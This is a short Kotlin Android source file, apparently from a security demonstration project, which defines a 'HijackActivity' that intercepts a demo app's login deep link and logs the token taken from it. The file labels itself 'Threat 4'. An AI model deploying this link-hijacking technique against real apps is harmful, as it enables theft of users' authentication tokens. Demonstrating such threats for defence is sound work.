package com.shezguard.attacker

import android.app.Activity
import android.os.Bundle
import android.util.Log

/** Threat 4: receives the demo app's login link when it is delivered here instead, and logs the token. */
class HijackActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val token = intent.data?.getQueryParameter("token")
        Log.w(AttackActivity.TAG, "HIJACKED link for ${intent.data?.scheme}://${intent.data?.host}, token=$token")
        finish()
    }
}
